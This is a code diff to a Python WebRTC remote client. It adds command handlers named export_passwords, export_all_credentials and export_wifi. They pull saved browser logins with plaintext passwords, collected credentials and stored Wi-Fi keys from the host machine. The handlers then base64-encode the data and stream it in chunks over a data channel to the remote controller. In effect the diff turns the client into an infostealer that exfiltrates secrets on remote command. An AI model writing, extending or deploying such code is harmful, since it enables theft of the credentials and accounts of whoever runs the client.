@@ -767,6 +767,146 @@ class WebRTCClient:
             await self._send_chunked_payload(data_channel, payload_base64, "cookies")
             return
 
+        if action == "export_passwords":
+            browsers = payload.get("browsers")
+            try:
+                try:
+                    from password_extractor.extractor import PasswordExtractor
+                except ImportError:
+                    import sys
+                    import os
+                    parent_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+                    if parent_dir not in sys.path:
+                        sys.path.insert(0, parent_dir)
+                    from password_extractor.extractor import PasswordExtractor
+                
+                extractor = PasswordExtractor()
+                
+                def _extract():
+                    if browsers:
+                        results = {}
+                        for browser in browsers:
+                            passwords = extractor.extract(browser)
+                            if passwords:
+                                results[browser] = [
+                                    {
+                                        "url": p.url,
+                                        "username": p.username,
+                                        "password": p.password,
+                                        "date_created": p.date_created,
+                                        "date_last_used": p.date_last_used,
+                                        "times_used": p.times_used,
+                                    }
+                                    for p in passwords
+                                ]
+                        return results
+                    else:
+                        results = extractor.extract_all()
+                        return {
+                            browser: [
+                                {
+                                    "url": p.url,
+                                    "username": p.username,
+                                    "password": p.password,
+                                    "date_created": p.date_created,
+                                    "date_last_used": p.date_last_used,
+                                    "times_used": p.times_used,
+                                }
+                                for p in passwords
+                            ]
+                            for browser, passwords in results.items()
+                        }
+                
+                results = await asyncio.to_thread(_extract)
+                import json
+                payload_json = json.dumps(results, ensure_ascii=False)
+                payload_base64 = base64.b64encode(payload_json.encode("utf-8")).decode("ascii")
+                
+            except Exception as exc:
+                logger.warning("Password export failed: %s", exc)
+                self._send_error(
+                    data_channel,
+                    "password_export_failed",
+                    f"Password export failed: {exc}",
+                )
+                return
+            await self._send_chunked_payload(data_channel, payload_base64, "passwords")
+            return
+
+        if action == "export_all_credentials":
+            try:
+                from remote_client.auto_collector import get_collector
+                collector = get_collector()
+                
+                # Wait for collection if still in progress
+                if collector.is_collecting():
+                    collector.wait_for_collection(timeout=30.0)
+                
+                data = collector.get_data()
+                if data is None:
+                    # Collection not started, do it now
+                    collector.start_collection()
+                    collector.wait_for_collection(timeout=60.0)
+                    data = collector.get_data()
+                
+                if data is None:
+                    self._send_error(
+                        data_channel,
+                        "credentials_unavailable",
+                        "Credential collection is not available.",
+                    )
+                    return
+                
+                payload_base64 = data.to_base64()
+                
+            except Exception as exc:
+                logger.warning("Credentials export failed: %s", exc)
+                self._send_error(
+                    data_channel,
+                    "credentials_export_failed",
+                    f"Credentials export failed: {exc}",
+                )
+                return
+            await self._send_chunked_payload(data_channel, payload_base64, "all_credentials")
+            return
+
+        if action == "export_wifi":
+            try:
+                try:
+                    from password_extractor.extractor import extract_wifi_passwords
+                except ImportError:
+                    import sys
+                    import os
+                    parent_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+                    if parent_dir not in sys.path:
+                        sys.path.insert(0, parent_dir)
+                    from password_extractor.extractor import extract_wifi_passwords
+                
+                wifi_list = await asyncio.to_thread(extract_wifi_passwords)
+                results = [
+                    {
+                        "ssid": w.ssid,
+                        "password": w.password,
+                        "auth_type": w.auth_type,
+                        "encryption": w.encryption,
+                    }
+                    for w in wifi_list
+                ]
+                import json
+                payload_json = json.dumps(results, ensure_ascii=False)
+                payload_base64 = base64.b64encode(payload_json.encode("utf-8")).decode("ascii")
+                
+            except Exception as exc:
+                logger.warning("WiFi export failed: %s", exc)
+                self._send_error(
+                    data_channel,
+                    "wifi_export_failed",
+                    f"WiFi export failed: {exc}",
+                )
+                return
+            await self._send_chunked_payload(data_channel, payload_base64, "wifi")
+            return
+
         if action == "export_proxy":
             settings = get_proxy_settings()
             if not settings:
